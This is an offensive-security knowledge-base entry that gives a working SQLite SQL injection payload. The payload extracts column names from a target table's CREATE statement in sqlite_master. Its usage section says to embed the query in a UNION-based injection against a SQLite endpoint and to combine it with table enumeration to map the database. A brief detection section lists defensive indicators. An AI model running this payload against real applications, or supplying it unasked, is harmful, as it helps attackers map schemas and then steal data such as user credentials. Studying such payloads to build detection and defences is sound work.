---
id: abd68152-93d3-40f4-abb0-488cc92ca3ec
type: code
language: SQL
verified: true
created_at: '2023-04-06T03:56:37.018232+00:00'
updated_at: '2023-04-10T20:24:31.294791+00:00'
tags:
  - sqli
  - sqlite
  - column-enumeration
platforms:
  - Database
validated: true
---

# SQLite-Clean-Column-Names-from-Table-Definition

## Code

```sql
SELECT replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,'(')%2b1)),instr((substr(sql,instr(sql,'(')%2b1)),'')),'TEXT',''),'INTEGER',''),'AUTOINCREMENT',''),'PRIMARY KEY',''),'UNIQUE',''),'NUMERIC',''),'REAL',''),'BLOB',''),'NOT NULL',''),',','~~') FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='table_name'
```

## Description

This SQL query extracts and cleans the column definitions from a table's CREATE statement in sqlite_master by removing common SQLite data types, constraints, and keywords using nested REPLACE functions. It substrings the content after the opening parenthesis to focus on the column list, then replaces commas with '~~' as a delimiter for easy parsing. This string-based technique is ideal for SQL injection payloads aimed at schema discovery without direct access.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| table_name | Name of the target table | users |

## Usage

Use this in a SQL injection payload against a SQLite endpoint, e.g., ' UNION SELECT [query]--. It processes the raw SQL from sqlite_master to output a delimited list of column names, such as "id~~username~~password". Combine with prior table enumeration to systematically map the database schema.

## Detection

- Detect nested REPLACE or SUBSTR functions in queries, which are atypical for legitimate app logic.
- Flag access to sqlite_master combined with string manipulation functions.
- Use query parsing tools to identify attempts to alter or extract schema elements.

## Related

- [[procedures/SQLite-Column-Name-Extraction-via-SQL-Injection]]
